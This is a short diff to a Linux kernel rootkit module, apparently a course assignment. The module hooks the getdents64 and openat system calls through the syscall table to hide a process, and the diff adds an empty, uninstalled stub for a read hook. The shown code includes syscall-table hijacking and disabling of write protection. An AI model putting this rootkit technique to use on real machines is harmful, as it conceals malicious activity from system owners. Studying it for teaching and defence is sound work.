@@ -94,6 +94,7 @@ asmlinkage int sneaky_sys_getdents64(struct pt_regs * regs)
   snprintf(pid_str, sizeof(pid_str), "%d", sneaky_pid);
 
   // call the original getdents64
+  // find nread for the iterator (like a linked list)
   nread = original_getdents64(regs);
   if (nread <= 0) {
     return nread;
@@ -116,6 +117,13 @@ asmlinkage int sneaky_sys_getdents64(struct pt_regs * regs)
   return nread;
 }
 
+/*                             read                               */
+asmlinkage int (*original_read)(struct pt_regs *);
+
+asmlinkage int sneaky_sys_read(struct pt_regs * regs) {
+
+}
+
 // The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void)
 {
@@ -131,12 +139,14 @@ static int initialize_sneaky_module(void)
   // table with the function address of our new code.
   original_openat = (void *)sys_call_table[__NR_openat];
   original_getdents64 = (void *)sys_call_table[__NR_getdents64];
+  original_read = (void *)sys_call_table[__NR_read];
   
   // Turn off write protection mode for sys_call_table
   enable_page_rw((void *)sys_call_table);
   
   sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
   sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
+  // sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
 
   // You need to replace other system calls you need to hack here
   
@@ -158,6 +168,7 @@ static void exit_sneaky_module(void)
   // function address. Will look like malicious code was never there!
   sys_call_table[__NR_openat] = (unsigned long)original_openat;
   sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
+  sys_call_table[__NR_read] = (unsigned long)original_read;
 
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);  
